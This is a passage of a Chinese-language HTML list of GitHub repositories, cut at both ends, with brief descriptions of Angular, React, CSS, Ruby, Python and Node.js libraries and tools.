<a href=""https://github.com/driftyco/ng-cordova"" rel=""nofollow noreferrer"">ng-cordova</a>: Cordova 常用组件的 Angular 版本</li>
<li>
<a href=""https://github.com/angular-translate/angular-translate"" rel=""nofollow noreferrer"">angular-translate</a>: Angular 的国际化 (I18n)</li>
<li>
<a href=""https://github.com/rev087/ng-inspector"" rel=""nofollow noreferrer"">ng-inspector</a>: Chrome 插件，用于调试 Angular</li>
<li>
<a href=""https://github.com/mgechev/angularjs-style-guide"" rel=""nofollow noreferrer"">angularjs-style-guide</a>: AngularJS 代码风格</li>
<li>
<a href=""https://github.com/davidchang/ngReact"" rel=""nofollow noreferrer"">ngReact</a>: React 的 Angular 插件，可以在 Angular 中使用 React Components</li>
<li>
<a href=""https://github.com/angular/material"" rel=""nofollow noreferrer"">material</a>: Google Material Design 效果的 Angular 实现</li>
<li>
<a href=""https://github.com/grevory/angular-local-storage"" rel=""nofollow noreferrer"">angular-local-storage</a>: Angular 插件, 提供了对 localStorage 的友好支持, 并对不支持的浏览器使用 cookie 优雅降级</li>
<li>
<a href=""https://github.com/a8m/angular-filter"" rel=""nofollow noreferrer"">angular-filter</a>: 一组有用的 Angular Filters</li>
<li>
<a href=""https://github.com/Pasvaz/bindonce"" rel=""nofollow noreferrer"">bindonce</a>: Angular 插件, 用于减少 Watcher 的数量, 提升性能</li>
</ul>
<h6>React</h6>
<ul>
<li>
<a href=""https://github.com/facebook/react"" rel=""nofollow noreferrer"">react</a>: React 框架源代码</li>
<li>
<a href=""https://github.com/facebook/react-native"" rel=""nofollow noreferrer"">react-native</a>: Facebook 出品的使用 React 开发 IOS 原生应用的框架</li>
<li>
<a href=""https://github.com/gaearon/react-hot-loader"" rel=""nofollow noreferrer"">react-hot-loader</a>: 实时调整 React 组件效果</li>
<li>
<a href=""https://github.com/ericclemmons/grunt-react"" rel=""nofollow noreferrer"">grunt-react</a>: React 的 Grunt 组件, 用于将 JSX 编译成 JS</li>
<li>
<a href=""https://github.com/JedWatson/touchstonejs"" rel=""nofollow noreferrer"">touchstonejs</a>: 基于 React 的手机应用前端框架</li>
<li>
<a href=""https://github.com/pheuter/essential-react"" rel=""nofollow noreferrer"">essential-react</a>: 基于 React, ES6, React-Router的一个应用脚手架</li>
<li>
<a href=""https://github.com/rackt/react-router"" rel=""nofollow noreferrer"">react-router</a>: React 路由解决方案</li>
<li>
<a href=""https://github.com/reactjs/react-redux"" rel=""nofollow noreferrer"">react-redux</a>: React redux 插件, 提供 React 的 Redux 支持</li>
<li>
<a href=""https://github.com/reactjs/redux"" rel=""nofollow noreferrer"">redux</a>: Javascript的可预测状态容器, 主要用于处理数据流向和管理状态</li>
<li>
<a href=""https://github.com/recharts/recharts"" rel=""nofollow noreferrer"">recharts</a>: 基于 React 和 D3 实现的图表工具</li>
</ul>
<h4>CSS</h4>
<ul>
<li>
<a href=""https://github.com/IanLunn/Hover"" rel=""nofollow noreferrer"">Hover</a>: 基于 CSS3 的各种 鼠标悬停(hover)特效, <a href=""http://ianlunn.github.io/Hover/"" rel=""nofollow noreferrer"">点击查看效果</a>
</li>
<li>
<a href=""https://github.com/necolas/normalize.css"" rel=""nofollow noreferrer"">normalize.css</a>: 一个用于重置浏览器内置样式的库</li>
<li>
<a href=""https://github.com/dhg/Skeleton"" rel=""nofollow noreferrer"">Skeleton</a>: 一个 CSS 相关的库，用于构建对手机友好的网站</li>
<li>
<a href=""https://github.com/yahoo/pure"" rel=""nofollow noreferrer"">pure</a>: Yahoo 出品的前端样式框架, 支持响应式</li>
<li>
<a href=""https://github.com/dogfalo/materialize/"" rel=""nofollow noreferrer"">materialize</a>: 基于谷歌 Material Design 的响应式 CSS</li>
</ul>
<p>框架</p>
<ul>
<li>
<a href=""https://github.com/olton/Metro-UI-CSS"" rel=""nofollow noreferrer"">Metro UI</a>: 一个 Metro 风格的前端框架</li>
<li>
<a href=""https://daneden.github.io/animate.css"" rel=""nofollow noreferrer"">animate</a>: 簡單又好用的動畫庫，網站內有簡單的範例跟demo效果</li>
</ul>
<h4>ICON</h4>
<ul>
<li>
<a href=""https://github.com/saeedalipoor/icono"" rel=""nofollow noreferrer"">icono</a>: 一款用纯 CSS 实现的图标库</li>
<li>
<a href=""https://github.com/google/material-design-icons"" rel=""nofollow noreferrer"">material-design-icons</a>: Google 为 Material Design 出品的 ICON</li>
</ul>
<h2>Web 后端</h2>
<h4>Ruby</h4>
<ul>
<li>
<a href=""https://github.com/ruby/ruby"" rel=""nofollow noreferrer"">ruby</a>: Ruby 源代码</li>
<li>
<a href=""https://github.com/balvig/spyke"" rel=""nofollow noreferrer"">spyke</a>: 像使用 ActiveRecord 一样使用 RESTful API</li>
<li>
<a href=""https://github.com/twopoint718/reactive_record"" rel=""nofollow noreferrer"">reactive_record</a>: 根据 ActiveRecord 的 数据库 Schema 来反向生成 Model</li>
<li>
<a href=""https://github.com/eventmachine/eventmachine"" rel=""nofollow noreferrer"">eventmachine</a>: Ruby 中著名的事件驱动库</li>
<li>
<a href=""https://github.com/stympy/faker"" rel=""nofollow noreferrer"">faker</a>: Perl 的 Data::Faker 库的一个 Ruby 实现，用于虚拟各种类型的数据</li>
<li>
<a href=""https://github.com/ruby-amqp/amqp"" rel=""nofollow noreferrer"">amqp</a>: RabbitMQ 的 Ruby 客户端，基于 EventMachine</li>
<li>
<a href=""https://github.com/ruby-amqp/bunny"" rel=""nofollow noreferrer"">bunny</a>: 另一个 RabbitMQ 的 Ruby 客户端</li>
<li>
<a href=""https://github.com/pat/thinking-sphinx"" rel=""nofollow noreferrer"">thinking-sphinx</a>: Sphinx 全文搜索的 ActiveRecord 插件</li>
<li>
<a href=""https://github.com/jcupitt/ruby-vips"" rel=""nofollow noreferrer"">ruby-vips</a>: Ruby 的一款图像处理库, 基于 libvips</li>
<li>
<a href=""https://github.com/gocardless/statesman"" rel=""nofollow noreferrer"">statesman</a>: Ruby 的一个状态机</li>
<li>
<a href=""https://github.com/aasm/aasm"" rel=""nofollow noreferrer"">aasm</a>: 另一款 Ruby 状态机</li>
<li>
<a href=""https://github.com/airblade/paper_trail"" rel=""nofollow noreferrer"">paper_trail</a>: 一款强大的用于记录 Model 变更的库，非常适合于 创建记录的版本和审查变更</li>
<li>
<a href=""https://github.com/celluloid/timers"" rel=""nofollow noreferrer"">timers</a>: Ruby 的一个 Timer 库，适合于配合事件使用</li>
<li>
<a href=""https://github.com/gitlabhq/gitlab-shell"" rel=""nofollow noreferrer"">gitlab-shell</a>: gitlab 的命令行工具，用于替换 gitolite</li>
<li>
<a href=""https://github.com/RubyMoney/money"" rel=""nofollow noreferrer"">money</a>: Ruby 的一个数字、货币转换库</li>
<li>
<a href=""https://github.com/RubyMoney/money-rails"" rel=""nofollow noreferrer"">money-rails</a>: Rails 的一个数字、货币转换库</li>
<li>
<a href=""https://github.com/nomad/houston"" rel=""nofollow noreferrer"">houston</a>: APN 的 Ruby 库</li>
<li>
<a href=""https://github.com/scambra/devise_invitable"" rel=""nofollow noreferrer"">devise_invitable</a>: Devise 的一个插件，用于邀请用户</li>
<li>
<a href=""https://github.com/mikel/mail"" rel=""nofollow noreferrer"">mail</a>: Ruby 的处理邮件的库</li>
<li>
<a href=""https://github.com/tj/commander"" rel=""nofollow noreferrer"">commander</a>: Ruby 的命令行辅助库</li>
<li>
<a href=""https://github.com/helios-framework/helios"" rel=""nofollow noreferrer"">helios</a>: 一个为 IOS 提供后端支撑的库</li>
<li>
<a href=""https://github.com/middleman/middleman"" rel=""nofollow noreferrer"">middleman</a>: 一个辅助制作静态网站的工具</li>
<li>
<a href=""https://github.com/elabs/pundit"" rel=""nofollow noreferrer"">pundit</a>: 一个处理认证的库</li>
<li>
<a href=""https://github.com/elabs/refile"" rel=""nofollow noreferrer"">refile</a>: 一个处理图片上传的库</li>
<li>
<a href=""https://github.com/cowbell/sharedrop"" rel=""nofollow noreferrer"">sharedrop</a>: Airdrop 的 HTTP5 实现，基于 WebRTC</li>
<li>
<a href=""https://github.com/titanous/mailman"" rel=""nofollow noreferrer"">mailman</a>: 处理接收邮件的库</li>
<li>
<a href=""https://github.com/mruby/mruby"" rel=""nofollow noreferrer"">mruby</a>: mini-ruby (light-weight ruby) 轻量级 Ruby 源代码</li>
<li>
<a href=""https://github.com/utgarda/sidekiq-status"" rel=""nofollow noreferrer"">sidekiq-status</a>: Sidekiq 插件，用来监控任务状态</li>
<li>
<a href=""https://github.com/dockyard/postgres_ext"" rel=""nofollow noreferrer"">postgres_ext</a>: ActiveRecord 的插件，扩展了 PostgreSQL 相关的一些功能</li>
<li>
<a href=""https://github.com/prawnpdf/prawn"" rel=""nofollow noreferrer"">prawn</a>: Ruby 的 PDF 编辑工具</li>
<li>
<a href=""https://github.com/rails/spring"" rel=""nofollow noreferrer"">spring</a>: Rails 的加载器，可以加速 Rails 开发</li>
<li>
<a href=""https://github.com/rails/rails"" rel=""nofollow noreferrer"">rails</a>: Rails 源代码</li>
<li>
<a href=""https://github.com/xinminlabs/newrelic-grape"" rel=""nofollow noreferrer"">newrelic-grape</a>: Grape 的 Newrelic 插件</li>
<li>
<a href=""https://github.com/stevebartholomew/newrelic_moped"" rel=""nofollow noreferrer"">newrelic_moped</a>: Moped 的 Newrelic 插件</li>
<li>
<a href=""https://github.com/kickstarter/rack-attack"" rel=""nofollow noreferrer"">rack-attack</a>: 基于 Rack 的防攻击中间件</li>
<li>
<a href=""https://github.com/whitequark/rack-utf8_sanitizer"" rel=""nofollow noreferrer"">rack-utf8_sanitizer</a>: Rack 的 UTF8 序列化中间件</li>
<li>
<a href=""https://github.com/junegunn/redis-stat"" rel=""nofollow noreferrer"">redis-stat</a>: Redis 监控工具</li>
<li>
<a href=""https://github.com/MiniProfiler/rack-mini-profiler"" rel=""nofollow noreferrer"">rack-mini-profiler</a>: Rack 中间件，用于分析各个性能指标，如 SQL, View渲染等</li>
<li>
<a href=""https://github.com/SamSaffron/memory_profiler"" rel=""nofollow noreferrer"">memory_profiler</a>: 用于分析内存占用</li>
<li>
<a href=""https://github.com/tmm1/gctools"" rel=""nofollow noreferrer"">gctools</a>: 用于分析和优化 Ruby GC，可以配合 Unicorn 使用</li>
<li>
<a href=""https://github.com/mileszs/wicked_pdf"" rel=""nofollow noreferrer"">wicked_pdf</a>: Rails 插件，用于生成 PDF</li>
<li>
<a href=""https://github.com/steveklabnik/request_store"" rel=""nofollow noreferrer"">request_store</a>: Rack 中间件，用于保存仅单次请求有效的的全局变量，线程安全</li>
<li>
<a href=""https://github.com/slim-template/slim"" rel=""nofollow noreferrer"">slim</a>: 基于 Ruby 的前端模板引擎，类似于 Haml, 语法更简洁，据说相比于 Haml 会更快一些</li>
<li>
<a href=""https://github.com/colszowka/simplecov"" rel=""nofollow noreferrer"">simplecov</a>: Ruby 测试代码的覆盖率分析</li>
<li>
<a href=""https://github.com/sass/sass"" rel=""nofollow noreferrer"">sass</a>: CSS 框架，使得编写 CSS 更加容易和有趣，支持模块化、变量、运算、Mixin等</li>
<li>
<a href=""https://github.com/tripit/slate"" rel=""nofollow noreferrer"">slate</a>: 静态的 API 接口文档生成工具，干净、整洁、对手持设备友好、单页应用、代码高亮</li>
<li>
<a href=""https://github.com/dockyard/ruby-destroyed_at"" rel=""nofollow noreferrer"">ruby-destroyed_at</a>: ActiveRecord 扩展，支持安全删除</li>
<li>
<a href=""https://github.com/ricardochimal/taps"" rel=""nofollow noreferrer"">taps</a>: 支持数据库导入导出 -&gt; 原理是，对导出目标数据库建立一个服务器提供数据接口，然后对目标导入数据库进行数据导入，依赖 Sinatra 启动数据库接口服务</li>
<li>
<a href=""https://github.com/kpumuk/meta-tags"" rel=""nofollow noreferrer"">meta-tags</a>: 为 Rails 应用提供 SEO 优化支持</li>
<li>
<a href=""https://github.com/elasticsearch/logstash"" rel=""nofollow noreferrer"">logstash</a>: 日志、时间管理工具</li>
<li>
<a href=""https://github.com/rspec/rspec-rails"" rel=""nofollow noreferrer"">rspec-rails</a>: Rspec 的 Rails 插件</li>
<li>
<a href=""https://github.com/sparklemotion/nokogiri"" rel=""nofollow noreferrer"">nokogiri</a>: 一个功能强大，性能良好的用于解析 HTML, XML 的工具，支持 XPath 和 CSS 选择器</li>
<li>
<a href=""https://github.com/vcr/vcr"" rel=""nofollow noreferrer"">vcr</a>: 一个测试辅助库，纪录一组 HTTP 请求交互，并作为测试重现</li>
<li>
<a href=""https://github.com/thoughtbot/factory_girl"" rel=""nofollow noreferrer"">factory_girl</a>: 一个用来准备测试数据的库</li>
<li>
<a href=""https://github.com/simi/mongoid_paranoia"" rel=""nofollow noreferrer"">mongoid_paranoia</a>: Mongoid 软删除功能, 通过添加一个 destroyed_at</li>
<li>
<a href=""https://github.com/louismullie/treat"" rel=""nofollow noreferrer"">treat</a>: Ruby的自然语言处理</li>
<li>
<a href=""https://github.com/MacGapProject/MacGap1"" rel=""nofollow noreferrer"">MacGap1</a>: 一款工具可以将 HTML/CSS/JS 网络应用打包成 Mac App</li>
<li>
<a href=""https://github.com/ffi/ffi"" rel=""nofollow noreferrer"">ffi</a>: 可以帮助 Rubyer 开发基于 C 的 ruby 库, 提供了一套接口</li>
<li>
<a href=""https://github.com/mloughran/api_cache"" rel=""nofollow noreferrer"">api_cache</a>: 可以为外部接口添加缓存的工具</li>
<li>
<a href=""https://github.com/galetahub/ckeditor"" rel=""nofollow noreferrer"">ckeditor</a>: Rails 的 Ckeditor 插件</li>
<li>
<a href=""https://github.com/mailboxer/mailboxer"" rel=""nofollow noreferrer"">mailboxer</a>: Rails 插件, 可以发送消息/邮件</li>
<li>
<a href=""https://github.com/ko1/gc_tracer"" rel=""nofollow noreferrer"">gc_tracer</a>: Ruby GC 跟踪器</li>
<li>
<a href=""https://github.com/huobazi/carrierwave-qiniu"" rel=""nofollow noreferrer"">carrierwave-qiniu</a>: Carrierwave 的 七牛 插件</li>
<li>
<a href=""https://github.com/skyeagle/mongoid-ancestry"" rel=""nofollow noreferrer"">mongoid-ancestry</a>: Mongoid Ancestry 实现</li>
<li>
<a href=""https://github.com/hexorx/countries"" rel=""nofollow noreferrer"">countries</a>: 一个库包含全球各个国家的信息 (ISO 3166 (countries and states/subdivisions ), ISO 4217 (currency), and E.164 (phone numbers))</li>
<li>
<a href=""https://github.com/postmodern/chruby"" rel=""nofollow noreferrer"">chruby</a>: 切换 Ruby 的版本 和 可以和 ruby-install 配合</li>
<li>
<a href=""https://github.com/postmodern/ruby-install"" rel=""nofollow noreferrer"">ruby-install</a>: 用来安装 Ruby, JRuby, Rubinius, MagLev 或者 MRuby 环境</li>
<li>
<a href=""https://github.com/railsware/caphub"" rel=""nofollow noreferrer"">caphub</a>: 基于 capistrano 的集中发布管理实例</li>
<li>
<a href=""https://github.com/capistrano/chruby"" rel=""nofollow noreferrer"">chruby</a>: capistrano 的 chruby 支持</li>
<li>
<a href=""https://github.com/deivid-rodriguez/byebug"" rel=""nofollow noreferrer"">byebug</a>: Ruby 2 的一个调试器</li>
<li>
<a href=""https://github.com/opal/opal"" rel=""nofollow noreferrer"">opal</a>: Ruby -&gt; Javascript 代码转换工具</li>
<li>
<a href=""https://github.com/voltrb/volt"" rel=""nofollow noreferrer"">volt</a>: Ruby 的 一个 Web 框架, 使用 opal 使得前后端均可以用 Ruby 编写</li>
<li>
<a href=""https://github.com/bear-metal/tunemygc"" rel=""nofollow noreferrer"">tunemygc</a>: 用于分析 Ruby 的 GC, 并给出最合适的配置</li>
<li>
<a href=""https://github.com/grosser/parallel"" rel=""nofollow noreferrer"">parallel</a>: Ruby 的一个并行运算库</li>
<li>
<a href=""https://github.com/httprb/http.rb"" rel=""nofollow noreferrer"">http.rb</a>: Ruby 的一个 HTTP 库, 提供了链式的语法和完全的 Streaming 支持</li>
<li>
<a href=""https://github.com/plataformatec/has_scope"" rel=""nofollow noreferrer"">has_scope</a>: 用于在控制器中钩子中使用Scope</li>
<li>
<a href=""https://github.com/github/linguist"" rel=""nofollow noreferrer"">linguist</a>: Github 官方出品, 用于识别编程语言, 以及代码高亮</li>
<li>
<a href=""https://github.com/github/markup"" rel=""nofollow noreferrer"">markup</a>: Github 官方出品, 用于解析各类 markup 文件</li>
</ul>
<h4>Python</h4>
<ul>
<li>
<a href=""https://github.com/django/django"" rel=""nofollow noreferrer"">django</a>: 一个全栈式的 web 框架, 类似于 Rails</li>
<li>
<a href=""https://github.com/tomchristie/django-rest-framework"" rel=""nofollow noreferrer"">django-rest-framework</a>: django 的 一个  Rest API 框架</li>
<li>
<a href=""https://github.com/pallets/flask"" rel=""nofollow noreferrer"">flask</a>: 一个轻量级的 web 框架</li>
<li>
<a href=""https://github.com/sophron/wifiphisher"" rel=""nofollow noreferrer"">wifiphisher</a>: WIFI 中间人钓鱼攻击工具，获取用户名密码</li>
<li>
<a href=""https://github.com/jonathanslenders/python-prompt-toolkit"" rel=""nofollow noreferrer"">python-prompt-toolkit</a>: Python 的交互命令行工具，提供代码补全、高亮等</li>
<li>
<a href=""https://github.com/sripathikrishnan/redis-rdb-tools"" rel=""nofollow noreferrer"">redis-rdb-tools</a>: Redis 的 dump.rdb 文件解析器，用于分析内存使用、导出 JSON 以及 比较不同 rdb 文件差异</li>
<li>
<a href=""https://github.com/Supervisor/supervisor"" rel=""nofollow noreferrer"">supervisor</a>: 类UNIX下用于控制进程的一个开源库，通过配置可以监控、自动重启各种服务</li>
<li>
<a href=""https://github.com/yyuu/pyenv"" rel=""nofollow noreferrer"">pyenv</a>: Python 版本管理工具，类似于 RVM</li>
<li>
<a href=""https://github.com/scrapy/scrapy"" rel=""nofollow noreferrer"">scrapy</a>: 一个全能型的爬虫框架</li>
<li>
<a href=""https://github.com/binux/pyspider"" rel=""nofollow noreferrer"">pyspider</a>: 一个爬虫系统</li>
</ul>
<h4>Node.js</h4>
<ul>
<li>
<a href=""https://github.com/nwjs/nw.js"" rel=""nofollow noreferrer"">Node-Webkit.js</a>: Node-Webkit 是基于Chromium 和 node.js的运行环境，可以用来创建桌面应用程序</li>
<li>
<a href=""https://github.com/request/request"" rel=""nofollow noreferrer"">request</a>: 基于 Node.js 的用于网络请求的库，使用简单，功能强大</li>
<li>
<a href=""https://github.com/hapijs/hapi"" rel=""nofollow noreferrer"">hapi</a>: 一个配置优先的 web 框架，<a href=""http://hapijs.com/"" rel=""nofollow noreferrer"">hapijs.com</a>
</li>
<li>
<a href=""https://github.com/addyosmani/psi"" rel=""nofollow noreferrer"">psi</a>: 用于分析页面速度的工具，支持命令行</li>
<li>
<a href=""https://github.com/gulpjs/gulp"" rel=""nofollow noreferrer"">gulp</a>: 基于 Node.js 的流式构建系统</li>
<li>
<a href=""https://github.com/orchestrator/orchestrator"" rel=""nofollow noreferrer"">orchestrator</a>: 一个可以并行执行任务和依赖的库</li>
<li>
<a href=""https://github.com/rwaldron/johnny-five"" rel=""nofollow noreferrer"">johnny-five</a>: 用 Javascript 控制机器人</li>
<li>
<a href=""https://github.com/mozilla/popcorn-js"" rel=""nofollow noreferrer"">popcorn-js</a>: Mozilla 的一个开源项目，允许开发者基于 HTML5 音视频的时间线添加互动元素，比如注释，字幕，甚至动画</li>
<li>
<a href=""https://github.com/senchalabs/connect"" rel=""nofollow noreferrer"">connect</a>: Node 中间件支持，注：Express 4 以下依赖此库，从 4 开始支持全新的 Router，类似于 Rails Engine</li>
<li>
<a href=""https://github.com/Marak/faker.js"" rel=""nofollow noreferrer"">faker.js</a>: Faker 的 Node 实现，用于生成假数据</li>
<li>
<a href=""https://github.com/jstrace/chart"" rel=""nofollow noreferrer"">chart</a>: 用于终端生成 ASCII 图表</li>
<li>
<a href=""https://github.com/asciimoo/drawille"" rel=""nofollow noreferrer"">drawille</a>: 用于终端生成 ASCII 图形</li>
<li>
<a href=""https://github.com/sindresorhus/sparkly"" rel=""nofollow noreferrer"">sparkly</a>: spark.sh 的一个 Javascript 实现，终端生成 sparklines</li>
<li>
<a href=""https://github.com/node-inspector/node-inspector"" rel=""nofollow noreferrer"">node-inspector</a>: Node 的调试神器，使用方法，用 <code>node-debug</code> 代替 <code>node</code> 启动服务，并在你想调试的地方输入 <code>debugger</code>
</li>
<li>
<a href=""https://github.com/NodeOS/NodeOS"" rel=""nofollow noreferrer"">NodeOS</a>: 基于 Node 的操作系统</li>
<li>
<a href=""https://github.com/devongovett/pdfkit"" rel=""nofollow noreferrer"">pdfkit</a>: Node 和 浏览器均可以使用的，用于生成 PDF 的库</li>
<li>
<a href=""https://github.com/sindresorhus/empty-trash"" rel=""nofollow noreferrer"">empty-trash</a>: 清空垃圾桶</li>
<li>
<a href=""https://github.com/sindresorhus/trash"" rel=""nofollow noreferrer"">trash</a>: 安全删除文件 -&gt; 将文件放入垃圾桶</li>
<li>
<a href=""https://github.com/squaremo/rabbit.js"" rel=""nofollow noreferrer"">rabbit.js</a>: RabbitMQ 的 Node 客户端</li>
<li>
<a href=""https://github.com/tildeio/htmlbars"" rel=""nofollow noreferrer"">htmlbars</a>: 基于 Handlebars 的一个变种，可以编写直接操作 DOM 的辅助方法</li>
<li>
<a href=""https://github.com/lovell/sharp"" rel=""nofollow noreferrer"">sharp</a>: Node 的一个图像处理的库，基于 libvips</li>
<li>
<a href=""https://github.com/visionmedia/debug"" rel=""nofollow noreferrer"">debug</a>: 一个用于在 console 或者 浏览器输出日志，方便与 Debug 的工具</li>
<li>
<a href=""https://github.com/IonicaBizau/github-contributions"" rel=""nofollow noreferrer"">github-contributions</a>: 一个好玩的库，用于在 github 的 contribution calendar 上输出你想要的文字或者图案</li>
<li>
<a href=""https://github.com/hexojs/hexo"" rel=""nofollow noreferrer"">hexo</a>: 基于 Node 的静态博客，类似于 Octopress</li>
<li>
<a href=""https://github.com/grmmph/GhostScroll"" rel=""nofollow noreferrer"">GhostScroll</a>: Ghost 的一个主题</li>
<li>
<a href=""https://github.com/haydenbleasel/ghost-themes"" rel=""nofollow noreferrer"">ghost-themes</a>: 多个 Ghost 主题</li>
<li>
<a href=""https://github.com/unconed/TermKit"" rel=""nofollow noreferrer"">TermKit</a>: 一个基于 Chrome 和 Node 的终端应用</li>
<li>
<a href=""https://github.com/lrsjng/h5ai"" rel=""nofollow noreferrer"">h5ai</a>: 配置简单，美观的 http 静态目录，支持 Nginx、Apache 等</li>
<li>
<a href=""https://github.com/nodeapps/http-server"" rel=""nofollow noreferrer"">http-server</a>: Http 静态服务器，基于 Node, 配置简单</li>
<li>
<a href=""https://github.com/argon/node-apn"" rel=""nofollow noreferrer"">node-apn</a>: Node 的 APN (Apple Push Notification) 模块</li>
<li>
<a href=""https://github.com/chaijs/chai"" rel=""nofollow noreferrer"">chai</a>: Node 的 TDD/BDD 测试框架</li>
<li>
<a href=""https://github.com/iojs/io.js"" rel=""nofollow noreferrer"">io.js</a>: Node 的一个分支，更加活跃，开发更激进，最终的目的是合并入 Node.js</li>
<li>
<a href=""https://github.com/facebook/immutable-js"" rel=""nofollow noreferrer"">immutable-js</a>: 不可改变的集合, 前后端通用</li>
<li>
<a href=""https://github.com/tj/node-migrate"" rel=""nofollow noreferrer"">node-migrate</a>: Node 的数据库迁移框架</li>
<li>
<a href=""https://github.com/NetEase/pomelo"" rel=""nofollow noreferrer"">pomelo</a>: Node 游戏服务器框架，网易开发</li>
<li>
<a href=""https://github.com/yaronn/blessed-contrib"" rel=""nofollow noreferrer"">blessed-contrib</a>: 构建终端信息板 (Dashboard) 利器</li>
<li>
<a href=""https://github.com/mikaelbr/node-notifier"" rel=""nofollow noreferrer"">node-notifier</a>: Node 模块，可以发送本地通知，支持 Mac/Windows/Linux</li>
<li>
<a href=""https://github.com/prerender/prerender"" rel=""nofollow noreferrer"">prerender</a>: 用于预解析网站，主要解决单页应用(angular.js ember.js backbone.js 等)的搜索引擎 SEO 支持</li>
<li>
<a href=""https://github.com/alongubkin/spider"" rel=""nofollow noreferrer"">spider</a>: 一种新语言，目标是编译成 Javascript</li>
<li>
<a href=""https://github.com/jsdoc3/jsdoc"" rel=""nofollow noreferrer"">jsdoc</a>: 用来生成 Javascript API 文档的库</li>
<li>
<a href=""https://github.com/shakyShane/browser-sync"" rel=""nofollow noreferrer"">browser-sync</a>: 多浏览器(多设备)同步库，监控 CSS/Javascript/HTML 的变更并通知到浏览器；监控浏览器的操作，如滚动、点击等事件，同步到所有的开发设备。前端开发利器！</li>
<li>
<a href=""https://github.com/addyosmani/tmi"" rel=""nofollow noreferrer"">tmi</a>: 基于 Node 的命令行工具, 用于计算网站图片的权重，以及那些图片可以进一步优化</li>
<li>
<a href=""https://github.com/6to5/6to5"" rel=""nofollow noreferrer"">6to5</a>: 转换 ES6 代码为 ES5，提前使用 ES6 语法带来的各种畅快！</li>
<li>
<a href=""https://github.com/leizongmin/js-xss"" rel=""nofollow noreferrer"">js-xss</a>: 根据白名单过滤HTML(防止XSS攻击)</li>
<li>
<a href=""https://github.com/Unitech/PM2"" rel=""nofollow noreferrer"">PM2</a>: Node 进程管理，内置负载均衡，提供自动重启，热启动等功能，适合在生产环境下使用</li>
<li>
<a href=""https://github.com/rlidwka/sinopia"" rel=""nofollow noreferrer"">sinopia</a>: 私有 NPM 服务器</li>
<li>
<a href=""https://github.com/chriso/validator.js"" rel=""nofollow noreferrer"">validator.js</a>: 校验工具(url，邮箱，整数等), 内置几十种校验方法，前后端通用</li>
<li>
<a href=""https://github.com/node-webot/wechat"" rel=""nofollow noreferrer"">wechat</a>: 微信公共平台消息接口服务中间件</li>
<li>
<a href=""https://github.com/visionmedia/superagent"" rel=""nofollow noreferrer"">superagent</a>: 更 NB 的 Ajax 请求库，号称比 jQuery 更好用，前后端通用</li>
<li>
<a href=""https://github.com/cheeriojs/cheerio"" rel=""nofollow noreferrer"">cheerio</a>: Server 端的 jQuery, 相同的 API，支持 DOM 操作等</li>
<li>
<a href=""https://github.com/mcavage/node-restify"" rel=""nofollow noreferrer"">node-restify</a>: Node.js 的 REST API 框架，从 Express 中借鉴了很多，并去除了 render 等方法</li>
<li>
<a href=""https://github.com/tj/ejs"" rel=""nofollow noreferrer"">ejs</a>: Node.js 的前端模板引擎, 使用 &lt;%=  %&gt; 直接在 HTML中嵌入，简单易学</li>
<li>
<a href=""https://github.com/petkaantonov/bluebird"" rel=""nofollow noreferrer"">Bluebird</a>: 另一款实现 Promises/A+ 的库，相比于 Q，性能卓越</li>
<li>
<a href=""https://github.com/postwait/node-amqp"" rel=""nofollow noreferrer"">node-amqp</a>: RabbitMQ 的 Node 客户端</li>
<li>
<a href=""https://github.com/tgriesser/knex"" rel=""nofollow noreferrer"">Knex</a>: SQL 生成器，支持 PostgreSQL, MySQL 和 SQLite3， 用于和 Bookshelf 配合使用</li>
<li>
<a href=""https://github.com/mranney/node_redis"" rel=""nofollow noreferrer"">node_redis</a>: Node 的 Redis 客户端</li>
<li>
<a href=""https://github.com/elasticsearch/elasticsearch-js"" rel=""nofollow noreferrer"">elasticsearch-js</a>: ElasticSearch 的 Node 客户端</li>
<li>
<a href=""http://passportjs.org/"" rel=""nofollow noreferrer"">Passport</a>: Node 的认证中间件，支持 Express, 组件丰富, 支持多种认证策略，OAuth</li>
<li>
<a href=""https://github.com/bnoguchi/everyauth"" rel=""nofollow noreferrer"">everyauth</a>: 认证库，支持多种策略，OAuth，支持 Express</li>
<li>
<a href=""https://github.com/ciaranj/node-oauth"" rel=""nofollow noreferrer"">node-oauth</a>: Node 的 OAuth 支持</li>
<li>
<a href=""https://github.com/danwrong/restler"" rel=""nofollow noreferrer"">restler</a>: 一个 Node REST 客户端</li>
<li>
<a href=""https://github.com/jaredhanson/oauth2orize"" rel=""nofollow noreferrer"">oauth2orize</a>: Node 的服务端 OAuth支持</li>
<li>
<a href=""http://mochajs.org/"" rel=""nofollow noreferrer"">Mocha</a>: Node 的 TDD/BDD 测试框架</li>
<li>
<a href=""https://github.com/remy/nodemon"" rel=""nofollow noreferrer"">nodemon</a>: 开发时使用, 自动检测文件变更, 并重启服务</li>
<li>
<a href=""https://github.com/redis/hiredis-node"" rel=""nofollow noreferrer"">hiredis-node</a>: hiredis 的 Node 模块</li>
<li>
<a href=""https://github.com/auth0/node-jsonwebtoken"" rel=""nofollow noreferrer"">node-jsonwebtoken</a>: JsonWebToken 的 Node.js 实现</li>
<li>
<a href=""https://github.com/js2coffee/js2coffee"" rel=""nofollow noreferrer"">js2coffee</a>: 将 Javascript 转换成 CoffeeScript 的一个工具</li>
<li>
<a href=""https://github.com/klei/grunt-injector"" rel=""nofollow noreferrer"">grunt-injector</a>: Grunt 的 JS/CSS 自动注入工具, 可以自动将 JS/CSS 的引用注入到 HTML 文件中</li>
<li>
<a href=""https://github.com/NativeScript/NativeScript"" rel=""nofollow noreferrer"">NativeScript</a>: 使用 Javascript 来编写 IOS / Android 以及更多平台原生软件的库</li>
<li>
<a href=""https://github.com/bkeepers/rosie"" rel=""nofollow noreferrer"">rosie</a>: 用于生成 Javascript 对象, 方便测试, 类似于 factory_girl</li>
<li>
<a href=""https://github.com/senchalabs/jsduck"" rel=""nofollow noreferrer"">jsduck</a>: javascript 文档生成工具</li>
<li>
<a href=""https://github.com/arturadib/shelljs"" rel=""nofollow noreferrer"">shelljs</a>: shell 命令的 Node.js 封装, 支持 local 和 global 两种模式</li>
<li>
<a href=""https://github.com/indexzero/daemon.node"" rel=""nofollow noreferrer"">daemon.node</a>: 以后台守护进程启动 node 应用的最小化实现, 可作为学习源码使用</li>
<li>
<a href=""https://github.com/chjj/blessed"" rel=""nofollow noreferrer"">blessed</a>: Node 的命令行界面工具, 一共一组高级接口支持命令行绘图, 动画等</li>
<li>
<a href=""https://github.com/indutny/node-spdy"" rel=""nofollow noreferrer"">node-spdy</a>: Node 的 SPDY 支持</li>
<li>
